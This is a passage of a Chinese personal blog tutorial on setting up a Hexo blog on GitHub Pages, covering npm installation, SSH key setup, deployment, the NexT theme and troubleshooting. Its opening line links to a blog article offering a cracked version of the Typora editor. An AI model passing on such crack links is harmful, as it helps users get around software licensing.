href="https://blog.csdn.net/qq_56746297/article/details/141232176?ops_request_misc=&request_id=&biz_id=102&utm_term=typora%E7%A0%B4%E8%A7%A3%E7%89%88%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-141232176.nonecase&spm=1018.2226.3001.4450">Typora2024最新版破解方法（博主亲测可用）</a>)</p><p>&emsp;&emsp;账号准备：注册<span style="background-color: yellow;">GitHub账号</span>，用来搭建仓库，附官网<a href="https://github.com/">https://github.com/</a></p><p>&emsp;&emsp;前置知识：知晓<span style="background-color: yellow;">Markdown语法</span>、有HTML基础会好</p><h2 id="2、初始化GitHub仓库"><a href="#2、初始化GitHub仓库" class="headerlink" title="2、初始化GitHub仓库"></a>2、初始化GitHub仓库</h2><p>&emsp;&emsp;创建GitHub仓库：进入自己的GitHub账号主页，在Repositories中找到“New”跳转到仓库创建页面</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93.png" title="创建仓库"></p><hr><p>&emsp;&emsp;如图进行填写勾选，<span style="background-color: red;">注</span>：Repository name处必须填“<span style="background-color: yellow;">账号名字.github.io</span>”</p><h2 id="3、初始化Hexo"><a href="#3、初始化Hexo" class="headerlink" title="3、初始化Hexo"></a>3、初始化Hexo</h2><p>&emsp;&emsp;[1]、在电脑选一个喜欢的位置，新建一个文件夹作为博客文件夹，比如博主的博客就建在：D:\Blog</p><p>&emsp;&emsp;[2]、该目录下点击上方地址栏，输入cmd，打开命令行窗口，输入以安装Hexo：<span style="background-color: yellow;">npm i hexo-cli -g</span></p><p>&emsp;&emsp;[3]、同样是该窗口，输入：<span style="background-color: yellow;">npm install</span>，下载依赖</p><p>&emsp;&emsp;[4]、安装完成后即可初始化Hexo：<span style="background-color: yellow;">hexo init</span></p><p>&emsp;&emsp;恭喜你，到这一步你已经可以在本地运行你的博客了，不要关闭命令行窗口，输入：<span style="background-color: yellow;">hexo s</span>看看成果</p><p>&emsp;&emsp;虽然很丑而且还不能远程访问，不过果子得一口口吃，都会有的</p><h2 id="4、实现远程部署"><a href="#4、实现远程部署" class="headerlink" title="4、实现远程部署"></a>4、实现远程部署</h2><p>&emsp;&emsp;这一步，我们要使自己的博客能够被远程访问，即通过网址让他人能看到你的博客，最终效果就是你可以在离我不知道多远的地方看我的文章๑乛◡乛๑</p><p>&emsp;&emsp;[1]、同样，我们不需要关闭命令行窗口(当然如果你关闭了，重新打开就是了)，输入：<span style="background-color: yellow;">ssh</span>，检查ssh是否可用</p><p>&emsp;&emsp;[2]、无异常后，输入两行代码，让Git知道你的GitHub账号信息：</p><p>&emsp;&emsp;<code>git config --global user.name &quot;GitHub账号名&quot; </code></p><p>&emsp;&emsp;<code>git config --global user.email &quot;GitHub账号注册邮箱&quot;</code></p><p>&emsp;&emsp;[3]、在本地创建ssh秘钥，输入：</p><p>&emsp;&emsp;<code>ssh-keygen -t rsa -C &quot;GitHub账号注册邮箱&quot;</code></p><p>&emsp;&emsp;程序会出现三次暂停等候输入，不用理会直接跳过。随后会出现如下界面：</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BAssh%E5%AF%86%E9%92%A5.png" title="创建ssh密钥"></p><hr><p>&emsp;&emsp;[4]、完成后，根据上图第三行代码括号中路径，找到<span style="background-color: orange;">id_rsa.pub</span>文件，用记事本打开，复制密钥</p><p>&emsp;&emsp;[5]、来到GitHub个人主页，点击右上方个人账号头像，找到“Settings”，接着点击“SSH and GPG keys”</p><p>&emsp;&emsp;[6]、界面右侧会有绿色按钮“New SSH key”，点击，密钥名字任意，然后在“Key”处输入复制的密钥</p><p>&emsp;&emsp;[7]、密钥生成后，可以在原命令行窗口输入以检查是否有异：</p><p>&emsp;&emsp;<code>ssh git@github.com</code></p><p>&emsp;&emsp;密钥密钥，自然是保护用的，密钥生成使用后，GitHub便只允许本地有私钥文件的电脑进行内容推送，你的博客才不会被随意篡改</p><p>&emsp;&emsp;[8]、闲谈结束，接下来我们要让博客被推送到GitHub仓库中，首先下载必需插件：<span style="background-color: yellow;">npm install hexo-deployer-git –save</span></p><p>&emsp;&emsp;[9]、打开你的博客文件夹，找到<span style="background-color: orange;">_config.yml</span>文件，，用准备好的VsCode打开。这是博客的配置文件，之后的样式、文字、功能等修改都需要在此对代码进行修改</p><p>&emsp;&emsp;[10]、ctrl+快捷键搜索：<span style="background-color: yellow;">deploy</span>，并将此处代码修改为如下图示例：</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E4%BB%A3%E7%A0%81%E7%A4%BA%E8%8C%831.png" title="代码示范"></p><hr><p>&emsp;&emsp;显然，在“repo”这一行，大家应修改为：</p><p>&emsp;&emsp;<code>git@github.com:GitHub账号名/GitHub账号名.github.io.git</code></p><p>&emsp;&emsp;[11]、在原命令行窗口下，生成静态文件，输入：<span style="background-color: yellow;">hexo g</span></p><p>&emsp;&emsp;[12]、上传到GitHub，输入：<span style="background-color: yellow;">hexo d</span></p><p>&emsp;&emsp;如果你成功完成了上述十二步，现在是享受劳动成果的时候了，<span style="background-color: yellow;">https:&#x2F;&#x2F;账号名.github.io</span>，这就是专属于你的博客网址啦！&lt;(￣︶￣)&gt;</p><h2 id="5、使用更美观的主题（可选）"><a href="#5、使用更美观的主题（可选）" class="headerlink" title="5、使用更美观的主题（可选）"></a>5、使用更美观的主题（可选）</h2><p>&emsp;&emsp;有点丑，至少我是这么想的。来选个好看的主题吧，博主这里推荐Next主体和Butterfly主体，博主会以自身博客为例，讲解下载、使用Next主题。</p><p>&emsp;&emsp;[1]、打开GitHub，在搜索框搜索：<span style="background-color: yellow;">hexo next</span>，没错，这是GitHub大佬的杰作，点击“Code”，下载zip压缩包，解压到博客文件夹中的“theme”目录下</p><p>&emsp;&emsp;[2]、在博客文件夹目录的<span style="background-color: orange;">_config.yml</span>文件修改配置theme：</p><p>&emsp;&emsp;<code>theme: next</code></p><p>&emsp;&emsp;可以先在本地运行一下博客看看有没有成功更换主题，没忘吧•⌄•(忘了就参考第三板块倒数第二句)</p><p>&emsp;&emsp;[3]、当然，Next主体可更改的属性有很多，博主也还在学习怎么把博客变得更个性化，不过这不是有大佬嘛，推荐CSDN博主ywang_wnlo：<a href="https://blog.csdn.net/CoolBoySilverBullet/article/details/121719830?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226298D213-4C23-421C-88C8-99A1DE4019D6%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6298D213-4C23-421C-88C8-99A1DE4019D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-121719830-null-null.nonecase&utm_term=hexonext&spm=1018.2226.3001.4450">【Hexo】NexT 主题的配置使用记录</a></p><h2 id="6、发表第一篇博客"><a href="#6、发表第一篇博客" class="headerlink" title="6、发表第一篇博客"></a>6、发表第一篇博客</h2><p>&emsp;&emsp;来吧，发篇博客体验一下，打开你的Typora开始写文咯，这里我将讲述我新建文章的方法</p><p>&emsp;&emsp;[1]、新建一个.md文件，在利用Typora完成编写后，将文件另存到：<span style="background-color: yellow;">hexo next博客文件夹&#x2F;source&#x2F;_posts&#x2F;</span></p><p>&emsp;&emsp;[2]、在博客文件夹下通过cmd命令打开命令行窗口，依次输入以下三行代码，我简称为“三板斧”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过上述三行代码，你的Hexo博客和GitHub仓库会被更新，写好的md文件也会挂在博客上</p><p>&emsp;&emsp;<span style="background-color: red;">注</span>：在每次修改博客文件夹中内容后，都需运行一遍“三板斧”，才会在博客中生效</p><h2 id="7、可能出现的报错及解决方案"><a href="#7、可能出现的报错及解决方案" class="headerlink" title="7、可能出现的报错及解决方案"></a>7、可能出现的报错及解决方案</h2><p>&emsp;&emsp;来说说我目前在建博客上碰到的壁，满满血泪史(Ｔ▽Ｔ)</p><p>&emsp;&emsp;[1]、在使用npm包管理器下载<span style="background-color: yellow;">hexo-cli</span>时卡住，可尝试两种手段</p><p>&emsp;&emsp;&emsp;①、修改npm源为阿里的镜像源，不使用国外服务器：</p><p>&emsp;&emsp;&emsp;<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><p>&emsp;&emsp;&emsp;②、未下载依赖：<span style="background-color: yellow;">npm install</span></p><p>&emsp;&emsp;随后重新进行<span style="background-color: yellow;">hexo-cli</span>下载，即重新进行3~[2]，若使用手段①，只需将命令开头的npm改为<span style="background-color: yellow;">cnpm</span></p><p>&emsp;&emsp;[2]、检查自己创建的仓库是不是公开的，即“Public”，若不是，在该步骤会出现问题：4~[12]</p><p>&emsp;&emsp;[3]、一定是根据4~[5]找到“Settings”，而不是在仓库的“Settings”中的“Deploy keys”中操作</p><p>&emsp;&emsp;以下是在写文章时遇到的问题(っ╥╯﹏╰╥c)</p><p>&emsp;&emsp;[4]、如果你想根据标题建立目录，不要使用Typora的一键目录，使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--toc--&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;[5]、不知为何，当使用Markdown文件的高亮语法“&#x3D;&#x3D;高亮内容&#x3D;&#x3D;”时，Hexo上无法显示，这里可以直接使用HTML语法：</p><p>&emsp;&emsp;<code>&lt;span style=&quot;background-color: yellow;&quot;&gt;高亮内容&lt;/span&gt;</code></p><p>&emsp;&emsp;[6]、为了插入图片，我也同样撞了两次壁，查了百度，查了CSDN，找到成功方案，以下使用C++注释风格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//在博客文件夹的_config.yml文件修改</span><br><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br><span class="line">//在博客文件夹下打开命令行窗口，安装新插件</span><br><span class="line">npm install hexo-asset-img --save</span><br><span class="line">//在/source/_posts/中建立一个同md文件相同名字的文件夹，将图片存放进去</span><br><span class="line">//插入图片的语法必须要求如下(至少咱试了下其他的，都没出来)</span><br><span class="line">！[](图片路径/图片名.图片后缀 &quot;图片名&quot;) // 路径使用相对路径</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;看到这里，肯定有些人没有找到想要的解决方案，没关系，CSDN嘛，总会找到的，期待你的博客！</p><p>&emsp;&emsp;╭（′▽‵）╭（′▽‵）╭（′▽‵）╯</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
